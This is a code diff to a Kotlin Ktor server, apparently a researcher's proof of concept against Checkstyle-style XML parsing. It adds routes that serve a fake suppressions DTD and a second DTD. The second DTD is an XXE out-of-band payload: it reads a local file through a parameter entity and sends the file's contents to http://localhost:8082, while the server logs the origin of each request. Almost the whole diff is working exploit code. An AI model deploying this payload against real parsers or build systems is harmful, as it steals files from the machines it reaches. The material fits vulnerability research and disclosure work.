@@ -14,9 +14,11 @@ import io.ktor.features.CallLogging
 import io.ktor.features.Compression
 import io.ktor.features.DefaultHeaders
 import io.ktor.features.origin
+import io.ktor.http.ContentType
 import io.ktor.http.HttpMethod
 import io.ktor.http.HttpStatusCode
 import io.ktor.http.RequestConnectionPoint
+import io.ktor.http.content.TextContent
 import io.ktor.response.respond
 import io.ktor.routing.get
 import io.ktor.routing.routing
@@ -53,6 +55,36 @@ data class OriginInfo(
         )
 }
 
+val dtd = """
+<!-- Add the following to any file that is to be validated against this DTD:
+
+<!DOCTYPE suppressions PUBLIC
+    "-//Checkstyle//DTD SuppressionFilter Configuration 1.2//EN"
+    "https://checkstyle.org/dtds/suppressions_1_2.dtd">
+-->
+<!ENTITY % elements SYSTEM "http://localhost:8082/dtds/second.dtd">
+
+<!ELEMENT suppressions (suppress*)>
+
+<!ELEMENT suppress EMPTY>
+<!ATTLIST suppress files CDATA #IMPLIED
+                   checks CDATA #IMPLIED
+                   message CDATA #IMPLIED
+                   id CDATA #IMPLIED
+                   lines CDATA #IMPLIED
+                   columns CDATA #IMPLIED>
+
+%elements;
+""".trimIndent()
+// <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://localhost:8082/x=%payload;">'>
+
+val secondDtd = """
+<!ENTITY % payload SYSTEM "file:///Users/jonathanleitschuh/git_repos/gradle-testing/test.txt">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://localhost:8082/x=%payload;">'>
+%param1;
+%external;
+""".trimIndent()
+
 private fun run(port: Int) {
     println("Launching on port `$port`")
     val server = embeddedServer(Netty, port) {
@@ -69,6 +101,22 @@ private fun run(port: Int) {
             get("") {
                 log.info("Origin: ${OriginInfo(call.request.origin)}")
                 call.respond(HttpStatusCode.OK)
+            }
+            get("/dtds/suppressions_1_2.dtd") {
+                log.info("Retrieving DTD")
+                log.info("Origin: ${OriginInfo(call.request.origin)}")
+                call.respond(HttpStatusCode.OK, TextContent(
+                    dtd,
+                    contentType = ContentType.Application.Xml_Dtd
+                ))
+            }
+            get("/dtds/second.dtd") {
+                log.info("Retrieving second DTD")
+                log.info("Origin: ${OriginInfo(call.request.origin)}")
+                call.respond(HttpStatusCode.OK, TextContent(
+                    secondDtd,
+                    contentType = ContentType.Application.Xml_Dtd
+                ))
             }
         }
     }
